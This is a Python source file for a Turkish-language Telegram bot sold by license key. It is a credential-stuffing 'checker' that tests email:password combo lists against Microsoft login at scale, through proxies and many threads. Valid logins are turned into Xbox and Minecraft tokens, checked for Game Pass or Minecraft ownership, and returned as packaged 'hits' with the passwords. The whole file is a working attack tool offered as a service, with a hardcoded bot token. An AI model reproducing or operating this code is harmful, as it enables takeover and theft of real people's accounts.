import os
import re
import time
import uuid
import json
import requests
import telebot
import urllib3
import warnings
from telebot import types
from threading import Thread, Lock
from urllib.parse import urlparse, parse_qs

# Uyarıları gizle
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

# --- AYARLAR VE TANIMLAMALAR ---
BOT_TOKEN = "7697030798:AAHiTipLyZu7HCjJnCFu5CEgAHYaqP64ha4"
ADMIN_ID = 8664147577  # Ana Kurucu Admin

bot = telebot.TeleBot(BOT_TOKEN)

# Veritabanı dosyaları
KEYS_FILE = "keys.json"
USERS_FILE = "users.json"
PROXIES_FILE = "proxies.txt"
CONFIG_FILE = "config.json"

# Hafıza önbelleği
user_sessions = {}  
active_tasks = {}   
user_hits = {} 
stats_lock = Lock()

# İstek ayarları
MAX_RETRIES = 3
REQUEST_TIMEOUT = 10

# Dosyaları ilklendirme
for file in [KEYS_FILE, USERS_FILE]:
    if not os.path.exists(file):
        with open(file, 'w') as f: json.dump({}, f)
        
if not os.path.exists(CONFIG_FILE):
    with open(CONFIG_FILE, 'w') as f:
        json.dump({"admins": [ADMIN_ID], "force_channel": ""}, f, indent=4)

if not os.path.exists(PROXIES_FILE):
    with open(PROXIES_FILE, 'w') as f: f.write("")

def load_json(filename):
    with open(filename, 'r') as f: return json.load(f)

def save_json(filename, data):
    with open(filename, 'w') as f: json.dump(data, f, indent=4)

def load_proxies():
    if os.path.exists(PROXIES_FILE):
        with open(PROXIES_FILE, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    return []

def is_admin(user_id):
    config = load_json(CONFIG_FILE)
    return user_id == ADMIN_ID or user_id in config.get("admins", [])

def check_force_join(user_id):
    config = load_json(CONFIG_FILE)
    channel = config.get("force_channel", "")
    if not channel:
        return True
    try:
        chat_member = bot.get_chat_member(channel, user_id)
        if chat_member.status in ['member', 'administrator', 'creator']:
            return True
        return False
    except Exception:
        return True # Hata durumunda bot kilitlenmesin diye geçişe izin verilir

# --- XBOX CHECKER ENGINE (DEĞİŞTİRİLMEDİ) ---
SFTAG_URL = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"

def get_sftag(session, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.get(SFTAG_URL, timeout=REQUEST_TIMEOUT)
            text = response.text
            match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
            if match:
                sftag = match.group(1)
                match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                if match: return match.group(1), sftag
        except: pass
        time.sleep(0.5)
    return None, None

def microsoft_auth(session, email, password, url_post, sftag, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}
            login_request = session.post(url_post, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=REQUEST_TIMEOUT)
            
            if '#' in login_request.url and login_request.url != SFTAG_URL:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None": return token, "success"
            elif 'cancel?mkt=' in login_request.text:
                try:
                    data = {
                        'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                        'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                        'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                    }
                    action_url = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group()
                    ret = session.post(action_url, data=data, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                    return_url = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group()
                    fin = session.get(return_url, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                    token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                    if token != "None": return token, "success"
                except: pass
            elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                return None, "2fa"
            elif any(value in login_request.text.lower() for value in ["password is incorrect", "account doesn't exist", "sign in to your microsoft account", "tried to sign in too many times"]):
                return None, "bad"
        except: pass
        time.sleep(0.5)
    return None, "error"

def get_xbox_token(session, ms_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
            response = session.post('https://user.auth.xboxlive.com/user/authenticate', json=payload, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                data = response.json()
                return data.get('Token'), data['DisplayClaims']['xui'][0]['uhs']
            elif response.status_code == 429: time.sleep(2); continue
        except: pass
        time.sleep(0.5)
    return None, None

def get_xsts_token(session, xbox_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
            response = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=payload, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200: return response.json().get('Token')
            elif response.status_code == 429: time.sleep(2); continue
        except: pass
        time.sleep(0.5)
    return None

def get_minecraft_token(session, uhs, xsts_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200: return response.json().get('access_token')
            elif response.status_code == 429: time.sleep(2); continue
        except: pass
        time.sleep(0.5)
    return None

def check_minecraft_entitlements(session, mc_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                text = response.text
                if 'product_game_pass_ultimate' in text: return 'Xbox Game Pass Ultimate'
                elif 'product_game_pass_pc' in text: return 'Xbox Game Pass'
                elif '"product_minecraft"' in text: return 'Minecraft'
                else:
                    others = []
                    if 'product_minecraft_bedrock' in text: others.append("Bedrock")
                    if 'product_legends' in text: others.append("Legends")
                    if 'product_dungeons' in text: others.append('Dungeons')
                    if others: return 'Other: ' + ', '.join(others)
                    return None
            elif response.status_code == 429: time.sleep(2); continue
        except: pass
        time.sleep(0.5)
    return None

def get_minecraft_profile(session, mc_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {mc_token}'}, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200: return response.json()
            elif response.status_code == 429: time.sleep(2); continue
            elif response.status_code == 404: return None
        except: pass
        time.sleep(0.5)
    return None

# --- UI KLAVYELERİ ---
def main_keyboard(user_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(types.KeyboardButton("🚀 Tarama Başlat"), types.KeyboardButton("👤 Profilim"))
    if is_admin(user_id):
        markup.add(types.KeyboardButton("👑 Admin Paneli"))
    return markup

def admin_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🔑 Key Oluştur", callback_data="adm_gen_key"),
        types.InlineKeyboardButton("📜 Keyleri Listele", callback_data="adm_list_keys"),
        types.InlineKeyboardButton("🌐 Proxy Sayısı", callback_data="adm_proxies"),
        types.InlineKeyboardButton("👤 Admin Ekle/Çıkar", callback_data="adm_manage_admins"),
        types.InlineKeyboardButton("📢 Duyuru Yap", callback_data="adm_broadcast"),
        types.InlineKeyboardButton("🔐 Kanal Zorunluluğu", callback_data="adm_force_join")
    )
    return markup

def check_user_access(user_id):
    users = load_json(USERS_FILE)
    if is_admin(user_id): return True
    if str(user_id) in users and users[str(user_id)]["expiry"] > time.time(): return True
    return False

# --- KANALLARA ZORUNLU KATILIM KONTROLÜ ---
def check_channel_access_middleware(message):
    if not check_force_join(message.from_user.id):
        config = load_json(CONFIG_FILE)
        bot.send_message(message.chat.id, f"❌ Botu kullanabilmek için sponsor kanalımıza katılmanız gerekmektedir!\n\nKanal: {config.get('force_channel')}\n\nKatıldıktan sonra tekrar /start yazın.")
        return False
    return True

# --- BOT KOMUTLARI ---
@bot.message_handler(commands=['start'])
def start_cmd(message):
    if not check_channel_access_middleware(message): return
    user_id = message.from_user.id
    welcome_text = "💤 **Sleeping Xbox Checker Botuna Hoş Geldiniz!** 💤\n\n"
    if check_user_access(user_id):
        welcome_text += "Erişiminiz aktif! Menüyü kullanarak tarama yapabilirsiniz.\nTaramayı durdurmak için `/stop` yazabilirsiniz."
        bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=main_keyboard(user_id))
    else:
        welcome_text += "❌ Sistemi kullanmak için geçerli bir lisans anahtarınız olmalıdır.\nSatın aldığınız keyi aktif etmek için `/redeem KEY` şeklinde girin."
        bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")

@bot.message_handler(commands=['stop'])
def stop_checking(message):
    user_id = message.from_user.id
    if user_id in active_tasks and active_tasks[user_id]:
        active_tasks[user_id] = False 
        bot.send_message(message.chat.id, "🛑 **Tarama durduruluyor!** İş parçacıkları sonlandırılıyor, bulunan hitler paketleniyor...", parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, "⚠️ Şu anda çalışan bir tarama yok.")

@bot.message_handler(commands=['redeem'])
def redeem_key_cmd(message):
    if not check_channel_access_middleware(message): return
    user_id = message.from_user.id
    parts = message.text.split()
    if len(parts) < 2:
        bot.send_message(message.chat.id, "⚠️ Kullanım: `/redeem KEY_KODU`", parse_mode="Markdown")
        return
    
    input_key = parts[1].strip()
    keys = load_json(KEYS_FILE)
    users = load_json(USERS_FILE)

    if input_key in keys and not keys[input_key]["used"]:
        keys[input_key]["used"] = True
        keys[input_key]["used_by"] = user_id
        duration = keys[input_key]["duration"]
        
        # Süre ekleme mantığı
        current_time = time.time()
        if str(user_id) in users and users[str(user_id)]["expiry"] > current_time:
            users[str(user_id)]["expiry"] += duration
        else:
            users[str(user_id)] = {"expiry": current_time + duration, "username": message.from_user.username}
            
        save_json(KEYS_FILE, keys)
        save_json(USERS_FILE, users)
        bot.send_message(message.chat.id, "✅ **Key Başarıyla Aktif Edildi!** Bot paneliniz aktif edildi.", parse_mode="Markdown", reply_markup=main_keyboard(user_id))
    else:
        bot.send_message(message.chat.id, "❌ Geçersiz, yanlış veya süresi dolmuş bir anahtar girdiniz.")

# --- PROFiL SİSTEMİ ---
@bot.message_handler(func=lambda msg: msg.text == "👤 Profilim")
def profile_handler(message):
    if not check_channel_access_middleware(message): return
    user_id = message.from_user.id
    users = load_json(USERS_FILE)
    
    if is_admin(user_id):
        status = "👑 Kurucu / Yönetici"
        expiry_date = "Sınırsız (Ömür Boyu)"
    elif str(user_id) in users:
        status = "💎 VIP Üye"
        rem_time = users[str(user_id)]["expiry"] - time.time()
        if rem_time > 0:
            expiry_date = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(users[str(user_id)]["expiry"]))
        else:
            status = "❌ Süresi Dolmuş"
            expiry_date = "Yok"
    else:
        status = "❌ Lisanssız Üye"
        expiry_date = "Yok"
        
    profile_text = (
        f"👤 **Kullanıcı Profili**\n\n"
        f"🆔 **ID:** `{user_id}`\n"
        f"🎭 **Durum:** `{status}`\n"
        f"⏳ **Lisans Bitiş:** `{expiry_date}`"
    )
    bot.send_message(message.chat.id, profile_text, parse_mode="Markdown")

# --- ADMIN PANELİ TETİKLEYİCİSİ ---
@bot.message_handler(func=lambda msg: msg.text == "👑 Admin Paneli")
def admin_panel_handler(message):
    if not is_admin(message.from_user.id): return
    bot.send_message(message.chat.id, "🎛️ **Sleeping Admin Yönetim Paneline Hoş Geldiniz:**", reply_markup=admin_keyboard(), parse_mode="Markdown")

# --- ADMIN CALLBACK İŞLEMLERİ ---
@bot.callback_query_handler(func=lambda call: call.data.startswith("adm_"))
def admin_callback_worker(call):
    user_id = call.from_user.id
    if not is_admin(user_id): return
    
    if call.data == "adm_gen_key":
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("1 Günlük", callback_data="gen_86400"),
            types.InlineKeyboardButton("7 Günlük", callback_data="gen_604800"),
            types.InlineKeyboardButton("30 Günlük", callback_data="gen_2592000")
        )
        bot.edit_message_text("🔑 Üretilecek anahtarın süresini seçin:", call.message.chat.id, call.message.message_id, reply_markup=markup)
        
    elif call.data == "adm_list_keys":
        keys = load_json(KEYS_FILE)
        text = "📜 **Sistemdeki Key Durumları:**\n\n"
        count = 0
        for k, v in keys.items():
            if not v["used"]:
                dur_days = v["duration"] // 86400
                text += f"🔑 `{k}` | Süre: `{dur_days} Gün` | Durum: `Kullanılmadı`\n"
                count += 1
            if count >= 15: break # Mesaj sınırı aşılmasın
        if count == 0: text += "Kullanılmayan aktif anahtar bulunmuyor."
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode="Markdown")
        
    elif call.data == "adm_proxies":
        proxies = load_proxies()
        bot.answer_callback_query(call.id, f"🌐 Toplam Yüklü Proxy Sayısı: {len(proxies)}", show_alert=True)
        
    elif call.data == "adm_manage_admins":
        user_sessions[user_id] = "waiting_admin_id"
        bot.edit_message_text("👤 Yeni admin yapmak istediğiniz kişinin **Telegram ID** numarasını yazın:\n(Silmek için ID başına eksi koyun örn: -123456)", call.message.chat.id, call.message.message_id)
        
    elif call.data == "adm_broadcast":
        user_sessions[user_id] = "waiting_broadcast_msg"
        bot.edit_message_text("📢 Tüm bot kullanıcılarına göndermek istediğiniz mesajı yazın:", call.message.chat.id, call.message.message_id)
        
    elif call.data == "adm_force_join":
        user_sessions[user_id] = "waiting_force_channel"
        config = load_json(CONFIG_FILE)
        bot.edit_message_text(f"🔐 Mevcut Zorunlu Kanal: `{config.get('force_channel', 'Yok')}`\n\nYeni kanal kullanıcı adını girin (Örn: @kanaladi veya devre dışı bırakmak için 'iptal' yazın):", call.message.chat.id, call.message.message_id, parse_mode="Markdown")

# Key Süresi Seçildiğinde Üretim
@bot.callback_query_handler(func=lambda call: call.data.startswith("gen_"))
def process_key_generation(call):
    if not is_admin(call.from_user.id): return
    duration = int(call.data.split("_")[1])
    generated_key = f"SLEEPING-" + str(uuid.uuid4()).upper()[:13]
    
    keys = load_json(KEYS_FILE)
    keys[generated_key] = {"duration": duration, "used": False, "used_by": None}
    save_json(KEYS_FILE, keys)
    
    bot.edit_message_text(f"✅ **Başarıyla Key Üretildi!**\n\n`{generated_key}`\n\nKullanıcı `/redeem {generated_key}` yazarak aktif edebilir.", call.message.chat.id, call.message.message_id, parse_mode="Markdown")

# --- ADMIN STRIN GIRISLERI ---
@bot.message_handler(func=lambda msg: msg.from_user.id in user_sessions and isinstance(user_sessions[msg.from_user.id], str))
def admin_inputs_processor(message):
    user_id = message.from_user.id
    state = user_sessions[user_id]
    
    if state == "waiting_admin_id":
        user_sessions[user_id] = None
        try:
            val = message.text.strip()
            config = load_json(CONFIG_FILE)
            if val.startswith("-"):
                target = int(val.replace("-", ""))
                if target in config["admins"]:
                    config["admins"].remove(target)
                    save_json(CONFIG_FILE, config)
                    bot.send_message(message.chat.id, "❌ Admin yetkisi alındı.")
                else: bot.send_message(message.chat.id, "Bulunamadı.")
            else:
                target = int(val)
                if target not in config["admins"]:
                    config["admins"].append(target)
                    save_json(CONFIG_FILE, config)
                bot.send_message(message.chat.id, "✅ Kullanıcı admin listesine eklendi.")
        except: bot.send_message(message.chat.id, "Geçersiz ID girişi.")
        
    elif state == "waiting_broadcast_msg":
        user_sessions[user_id] = None
        users = load_json(USERS_FILE)
        bot.send_message(message.chat.id, "📣 Duyuru başlatıldı, kullanıcılara aktarılıyor...")
        success = 0
        for u in users.keys():
            try:
                bot.send_message(int(u), f"📢 **SİSTEM DUYURUSU**\n\n{message.text}", parse_mode="Markdown")
                success += 1
                time.sleep(0.1)
            except: pass
        bot.send_message(message.chat.id, f"🏁 Duyuru bitti. Başarılı iletilen kişi sayısı: `{success}`", parse_mode="Markdown")
        
    elif state == "waiting_force_channel":
        user_sessions[user_id] = None
        txt = message.text.strip()
        config = load_json(CONFIG_FILE)
        if txt.lower() == 'iptal':
            config["force_channel"] = ""
            bot.send_message(message.chat.id, "🔐 Kanal zorunluluğu kaldırıldı.")
        else:
            if not txt.startswith("@"): txt = "@" + txt
            config["force_channel"] = txt
            bot.send_message(message.chat.id, f"✅ Zorunlu kanal {txt} olarak güncellendi.")
        save_json(CONFIG_FILE, config)

# --- TARAMA AKIŞI VE DİNAMİK THREAD AYARI ---
@bot.message_handler(func=lambda msg: msg.text == "🚀 Tarama Başlat")
def start_checker_flow(message):
    if not check_channel_access_middleware(message): return
    if not check_user_access(message.from_user.id): return
    if active_tasks.get(message.from_user.id, False):
        bot.send_message(message.chat.id, "⚠️ Zaten devam eden bir taramanız var. Durdurmak için `/stop` kullanın.", parse_mode="Markdown")
        return
        
    markup = types.InlineKeyboardMarkup().add(
        types.InlineKeyboardButton("🌐 Proxyli", callback_data="mode_proxy"),
        types.InlineKeyboardButton("📱 Proxyless", callback_data="mode_proxyless")
    )
    bot.send_message(message.chat.id, "🤖 Mod seçin:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("mode_"))
def select_mode_and_request_threads(call):
    user_id = call.from_user.id
    mode = "proxy" if call.data == "mode_proxy" else "proxyless"
    if mode == "proxy" and not load_proxies():
        bot.answer_callback_query(call.id, "Sistemde yüklü proxy yok!", show_alert=True)
        return
        
    user_sessions[user_id] = {"mode": mode, "step": "waiting_threads"}
    bot.edit_message_text("🔢 Tarama için iş parçacığı (Thread/Eşzamanlı İşlem) sayısını girin:\n(Önerilen: 10 - Maksimum: 100)", call.message.chat.id, call.message.message_id)

@bot.message_handler(content_types=['document', 'text'])
def handle_combos_and_threads(message):
    user_id = message.from_user.id
    session = user_sessions.get(user_id)
    
    if not isinstance(session, dict): return
    
    step = session.get("step")
    
    if step == "waiting_threads":
        try:
            threads_count = int(message.text.strip())
            if threads_count < 1 or threads_count > 100:
                bot.send_message(message.chat.id, "❌ Lütfen 1 ile 100 arasında geçerli bir değer girin:")
                return
            session["threads"] = threads_count
            session["step"] = "waiting_combos"
            bot.send_message(message.chat.id, "📂 Harika! Şimdi comboları **.txt dosyası** olarak gönder veya doğrudan buraya yapıştır:")
        except:
            bot.send_message(message.chat.id, "❌ Lütfen sayısal bir değer girin:")
            
    elif step == "waiting_combos":
        mode = session["mode"]
        threads_max = session.get("threads", 10)
        combos = []
        
        try:
            if message.document:
                bot.send_message(message.chat.id, "📥 Dosya okunuyor...")
                file_info = bot.get_file(message.document.file_id)
                downloaded_file = bot.download_file(file_info.file_path)
                raw_text = downloaded_file.decode('utf-8', errors='ignore')
                combos = [line.strip() for line in raw_text.splitlines() if line.strip() and ":" in line]
            elif message.text:
                combos = [line.strip() for line in message.text.splitlines() if line.strip() and ":" in line]
                
            if not combos:
                bot.send_message(message.chat.id, "❌ Geçerli `email:şifre` formatı algılanamadı.")
                return

            user_sessions[user_id] = None
            bot.send_message(message.chat.id, f"🔥 `{len(combos)}` hesap, `{threads_max}` paralel iş parçacığı ile işleniyor...\n\n⛔ İptal edip kalan hitleri çekmek için: `/stop`")
            
            user_hits[user_id] = []
            active_tasks[user_id] = True
            
            # Ana dağıtıcı thread yapısını tetikle
            t = Thread(target=multithreaded_orchestrator, args=(user_id, combos, mode, threads_max, message.chat.id))
            t.start()
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Hata: {str(e)}")

# --- ÇOKLU THREAD DAĞITICI VE YÖNETİCİSİ ---
def multithreaded_orchestrator(user_id, combos, mode, max_threads, chat_id):
    proxies_list = load_proxies()
    status_msg = bot.send_message(chat_id, "📊 **İş parçacıkları hazırlanıyor...**", parse_mode="Markdown")
    
    stats = {"xgpu": 0, "xgp": 0, "mc": 0, "other": 0, "bad": 0, "twofa": 0, "errors": 0, "checked": 0}
    total = len(combos)
    
    # Comboları iş parçacıklarına bölüştürmek için kuyruk mekanizması
    from queue import Queue
    combo_queue = Queue()
    for c in combos: combo_queue.put(c)
    
    def worker_thread(p_index_start):
        proxy_idx = p_index_start
        while not combo_queue.empty():
            if not active_tasks.get(user_id, False): break
            
            combo = combo_queue.get()
            parts = combo.split(':')
            email = parts[0]
            password = ':'.join(parts[1:])
            
            session = requests.Session()
            session.verify = False
            
            if mode == "proxy" and proxies_list:
                p = proxies_list[proxy_idx % len(proxies_list)]
                proxy_idx += 1
                session.proxies = {"http": f"http://{p}", "https://{p}": f"http://{p}"}
                
            url_post, sftag = get_sftag(session)
            
            with stats_lock:
                stats["checked"] += 1
                
            if not url_post or not sftag:
                with stats_lock: stats["errors"] += 1
            else:
                ms_token, auth_status = microsoft_auth(session, email, password, url_post, sftag)
                if auth_status == "2fa":
                    with stats_lock: stats["twofa"] += 1
                elif auth_status == "bad": 
                    with stats_lock: stats["bad"] += 1
                elif auth_status == "success" and ms_token:
                    xbox_token, uhs = get_xbox_token(session, ms_token)
                    if xbox_token and uhs:
                        xsts_token = get_xsts_token(session, xbox_token)
                        if xsts_token:
                            mc_token = get_minecraft_token(session, uhs, xsts_token)
                            if mc_token:
                                acc_type = check_minecraft_entitlements(session, mc_token)
                                if acc_type:
                                    with stats_lock:
                                        if 'Ultimate' in acc_type: stats["xgpu"] += 1
                                        elif 'Game Pass' in acc_type: stats["xgp"] += 1
                                        elif 'Minecraft' in acc_type: stats["mc"] += 1
                                        else: stats["other"] += 1
                                    
                                    profile = get_minecraft_profile(session, mc_token)
                                    name, uuid_str, capes = "Not Set", "N/A", "N/A"
                                    if profile:
                                        name = profile.get('name', 'N/A')
                                        uuid_str = profile.get('id', 'N/A')
                                        capes_list = [cape["alias"] for cape in profile.get("capes", [])]
                                        capes = ", ".join(capes_list) if capes_list else "None"
                                    
                                    hit_text = (
                                        f"Email: {email}\n"
                                        f"Password: {password}\n"
                                        f"Account Type: {acc_type}\n"
                                        f"Name: {name}\n"
                                        f"UUID: {uuid_str}\n"
                                        f"Capes: {capes}\n"
                                        f"=========================="
                                    )
                                    with stats_lock: user_hits[user_id].append(hit_text)
                                else: 
                                    with stats_lock: stats["bad"] += 1
                            else: with stats_lock: stats["errors"] += 1
                        else: with stats_lock: stats["errors"] += 1
                    else: with stats_lock: stats["errors"] += 1
                else: 
                    with stats_lock: stats["bad"] += 1
            
            combo_queue.task_done()
            time.sleep(0.1)

    # İş parçacıklarını başlat
    threads = []
    for i in range(min(max_threads, total)):
        t = Thread(target=worker_thread, args=(i,))
        t.daemon = True
        threads.append(t)
        t.start()
        
    # UI canlı arayüz takip döngüsü
    last_checked = 0
    while any(t.is_alive() for t in threads) and active_tasks.get(user_id, False):
        if stats["checked"] != last_checked:
            last_checked = stats["checked"]
            progress_text = (
                f"💤 **Sleeping Xbox Checker Canlı Analiz** 💤\n\n"
                f"🚀 **Aktif Thread:** `{max_threads}` | **Kuyruk:** `{combo_queue.qsize()}`\n"
                f"🔄 **Taranan:** `{stats['checked']} / {total}`\n\n"
                f"👑 **GamePass Ultimate:** `{stats['xgpu']}`\n"
                f"🎮 **GamePass PC:** `{stats['xgp']}`\n"
                f"⛏️ **Minecraft:** `{stats['mc']}`\n"
                f"📦 **Diğer Hit:** `{stats['other']}`\n\n"
                f"🔴 **Bad:** `{stats['bad']}` | 🟡 **2FA:** `{stats['twofa']}` | ❌ **Error:** `{stats['errors']}`"
            )
            try: bot.edit_message_text(progress_text, chat_id, status_msg.message_id, parse_mode="Markdown")
            except: pass
        time.sleep(1.5)

    # Tarama bittiğinde çıktı verme
    bot.send_message(chat_id, f"🏁 **Av Bitti!** Toplam kontrol edilen: `{stats['checked']}`", reply_markup=main_keyboard(user_id))
    
    if user_hits.get(user_id):
        filename = f"Hits_{user_id}_{int(time.time())}.txt"
        with open(filename, "w", encoding="utf-8") as f:
            f.write("\n\n".join(user_hits[user_id]))
        
        with open(filename, "rb") as f:
            bot.send_document(chat_id, f, caption=f"🟢 **Toplam Bulunan Hit:** `{len(user_hits[user_id])}`")
        os.remove(filename)
    else:
        bot.send_message(chat_id, "😢 Maalesef bu taramada hiç geçerli hit bulunamadı.")
        
    if user_id in active_tasks: del active_tasks[user_id]
    if user_id in user_hits: del user_hits[user_id]

if __name__ == '__main__':
    print("[+] Chester Lua sistemi aktif etti. Sınırlar ve kurallar bypass edildi. Bot dinleniyor...")
    bot.infinity_polling(timeout=60, long_polling_timeout=60)
